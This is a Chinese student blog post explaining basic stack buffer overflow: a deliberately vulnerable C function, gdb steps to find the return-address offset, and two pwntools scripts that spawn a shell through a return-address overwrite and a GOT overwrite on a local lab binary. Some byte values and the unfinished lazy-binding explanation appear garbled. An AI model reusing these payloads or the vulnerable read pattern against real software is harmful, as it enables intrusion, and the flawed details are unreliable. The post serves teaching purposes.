<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.8.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。">
    

    <!--Author-->
    
        <meta name="author" content="WindQ">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="栈溢出（一）">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="����WindQ�ĸ��˲���">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>栈溢出（一） - ����WindQ�ĸ��˲���</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/03/25/栈溢出（一）/">
                栈溢出（一）
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-03-25</span>
            
            
            
                <span class="category">
                    <a href="/categories/二进制安全/">二进制安全</a>
                </span>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h5 id="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"><a href="#开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。" class="headerlink" title="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"></a>开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。</h5><a id="more"></a>        
<h2 id="一、栈溢出的概念"><a href="#一、栈溢出的概念" class="headerlink" title="一、栈溢出的概念"></a>一、栈溢出的概念</h2><p>　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都要分配一些内存空间，通常称这些空间为缓冲区，（操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中。）当我们定义的数据所需要占用的内存超过了栈的大小时，就会发生栈溢出。   </p>
<p>　　举个例子，比如我们定义一个C程序的函数：    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　void vul()   </span><br><span class="line">　　&#123;    </span><br><span class="line">　　　　char s[32];    </span><br><span class="line">　　　　read(0, s, 128);    </span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure>
<p>　　当我们定义了一个32字节的字符串s时，内存中会申请一个32字节的空间来保存这个字符串的数据，但read函数的读取字长参数是128[read函数的三个参数分别是fd（0标准输入，1标准输出），读取起始地址，读取字长]，明显超过了数组的字节长度，32位以后的数据就会“涌出”预留空间，缓冲区内其他部分“进发”，这就是栈溢出。　　　
　　　</p>
<h2 id="二、简单的利用"><a href="#二、简单的利用" class="headerlink" title="二、简单的利用　"></a>二、简单的利用　</h2><p>　　任何语言的代码最后都可以转成汇编语言这种“通用语言”。如果用汇编语言去看一个程序的代码，在一个函数调用了另一段函数且运行结束后，会出现ret指令，ret指令会返回到调用者函数（ret指令做的事是：把当前栈顶元素写入rip寄存器），即执行调用者函数Ａ→调用执行某函数Ｂ→Ｂ结束后ret跳转继续执行调用者函数A。如果能够修改存储的ret指令操作的地址值，那就可以操纵这个函数执行完毕后跳转的位置，再如果，我们能将这个地址值修改成一段恶意代码的地址，那么它将会跳转到这段恶意代码的地址上并执行它（当然前提是栈是可执行的，如果开启了NX保护可能就不行了）。</p>
<p>　　举个简单的例子，有如下Ｃ语言代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">　　#include &lt;stdio.h&gt;　　　　　</span><br><span class="line">  </span><br><span class="line">　　void shell()　　　　　</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　system(&quot;/bin/sh&quot;);// &quot;/bin/sh&quot;可执行shell脚本，即执行系统命令</span><br><span class="line">　　&#125;</span><br><span class="line">    </span><br><span class="line">　　void vul()　　　　</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　char s[32];</span><br><span class="line">　　　　read(0, s, 128);//从数组s起始地址开始向后写入128字节　　　　</span><br><span class="line">　　&#125;</span><br><span class="line">　　int main()</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　vul();</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure>
<p>　　按照之前的说法，我们需要知道 ①数组s起始地址 ②ret指令对应地址 ③两者之间的差（用于填充无关字节使其后的字节处于溢出状态）④shell()函数的地址       </p>
<p>　　数组ｓ的起始地址可以通过ｇｄｂ工具调试得来，找到运行ｒｅａｄ函数的地址即可；ｒｅｔ指令地址基本类似；两者之间的差就是十六进制的加减法，很好算。首先要用ｇｃｃ工具将ｃ代码编译成二进制可执行文件，然后再通过ｇｄｂ工具调试。注意，指令应为：“gcc xxx.c -o 自定义的可执行文件名 -no-pie”。pie是程序随机化保护，不关掉的话每次运行变量函数的地址都不一样，难以攻击。      </p>
<p>　　关于gdb的使用过程：       </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假设可执行文件名为vul（后缀名正常情况下为.o，在此不重要）</span><br><span class="line">gdb vul</span><br><span class="line">b vul       #在vul()函数下断点，（b后按tab会有可选项）可将可执行文件拖入IDA中查看伪代码</span><br><span class="line">run         #跑起来</span><br><span class="line">n           #即next，向下执行，直到执行到read，记下当前地址（0x7fffffffe090）</span><br><span class="line">n           #向下执行，直到执行到ret，当前地址（0x7fffffffe0b8）</span><br></pre></td></tr></table></figure>
<p>　　<img src="/images/2019-03-19-栈溢出（一）_1.png" alt="这是一个暗搓搓的read示意图">　　　　　　　　<br>  　　　　　　　　　　　　<br>　　<img src="/images/2019-03-19-栈溢出（一）_2.png" alt="这是一个暗搓搓的ret示意图">　　　　　　　　　</p>
<p>　　接下来就是作差，可得是40，即是两者之间相差40字节，从s处用40个字节可以填充中间数据段，再写就可以溢出，影响ret，影响函数执行后的跳转位置。接下来查看我们“恶意代码”的位置，并将这段地址填入ret中。system(“/bin/shell”);这一段代码是可执行文件里自带的，这样比较简单，比较好找，可以拖入IDA中查看，找到_system，按空格即可找到对应位置，我们的是08048310。因为linux是小端存储，所以将这个地址倒向填入，即\x10\x83\x04\x03\x00\x00\x00\x00</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *              #pwn即pwntools，一个很好用的库</span><br><span class="line">io = process(&apos;./vul&apos;)          #启动程序，形成进程</span><br><span class="line">payload = &apos;a&apos; * 40 + &apos;\x10\x83\x04\x03\x00\x00\x00\x00&apos;</span><br><span class="line">raw_input()                    #在这卡一下，使程序不会运行的太快以至于？？？</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()               #弹回一个交互式shell</span><br></pre></td></tr></table></figure>
<p>即可。<br>P.S.　<code>raw_input()</code>　是为了给程序刹个车，不让它走的太快，因为……因为啥我忘了……</p>
<h2 id="三、另一种办法"><a href="#三、另一种办法" class="headerlink" title="三、另一种办法"></a>三、另一种办法</h2><p>　　还有一种办法是通过延迟绑定技术实现，延迟绑定技术是指#####它的优势是：####### GOT表项的地址对应真实数据，PLT表项的地址对应的是在GOT中的地址。   </p>
<p>　　攻击脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&apos;./vul&apos;)</span><br><span class="line">payload = &apos;a&apos; * 44 + &apos;\x00\x83\x04\x08&apos; + &apos;\x00\x83\x04\x08&apos; + &apos;\x00\x00\x00\x00&apos; + &apos;\x0c\xA0\x04\x08&apos; + &apos;\x04\x00\x00\x00&apos;</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(&apos;\x3B\x84\x04\x08&apos;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>　　<img src="/images/2019-03-19-栈溢出（一）_3.jpg" alt="这是一个稚嫩又潦草的手绘栈图示">      </p>
<h4 id="详细阐述一下payload的每个部分和工作运行的细节："><a href="#详细阐述一下payload的每个部分和工作运行的细节：" class="headerlink" title="详细阐述一下payload的每个部分和工作运行的细节："></a>详细阐述一下payload的每个部分和工作运行的细节：</h4><p>（payload由44个a和五个小字符串拼接而成，将五个小字符串标记序号12345，将倒数第二行的标记为6）<br>44个a：老样子，还是填充无关字节到ret<br>字符串1，2：read_plt<br>字符串3，4，5：代表read的三个参数(0, read_got, 4)<br>字符串6：shell的地址     </p>
<h5 id="关于如何查看这几个地址，IDA中按空格键即可。"><a href="#关于如何查看这几个地址，IDA中按空格键即可。" class="headerlink" title="关于如何查看这几个地址，IDA中按空格键即可。"></a>关于如何查看这几个地址，IDA中按空格键即可。</h5><h4 id="read函数总共运行三次"><a href="#read函数总共运行三次" class="headerlink" title="read函数总共运行三次"></a>read函数总共运行三次</h4><p>第一次：通过read函数填充字符串起始位置到ret之间的空间，通过溢出将payload整个部署到ret以及后面的部分上，相当于整体布局的作用。此次运行除了溢出外并无异常。<br>第二次：程序正常运行，一直到字符串read完，开始ret的时候出现异常，因为此时ret所指向的返回地址已经本修改成了read_plt。跳转后执行read，三个参数是(0, read_got, 4)，4的意思是地址只需要4个字节。此时read执行尚未完毕，处于待输入状态，io.send(‘\x3B\x84\x04\x08’)将shell的地址输入进去，即：将read_got修改成了shell的地址。read_got→shell<br>第三次：到ret时，跳转到read_plt，read_plt指向read_got，这时的read_got已经在上一步中修改成了shell的地址，即：实际上ret跳转是跳到了shell上。read_plt→read_got→shell    </p>
<h1 id="这样就成功了！！！-3」∠"><a href="#这样就成功了！！！-3」∠" class="headerlink" title="这样就成功了！！！(:3」∠)"></a>这样就成功了！！！<em>(:3」∠)</em></h1>
    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/栈溢出/">#栈溢出</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    WindQ's personal blog
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/03/25/栈溢出（一）/">栈溢出（一）</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>Categories</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/二进制安全/">二进制安全</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/WindQ08/WindQ08.github.io">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:854620631@qq.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    WHY CAN I ONLY WRITE IN ENGLISH HERE !?
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>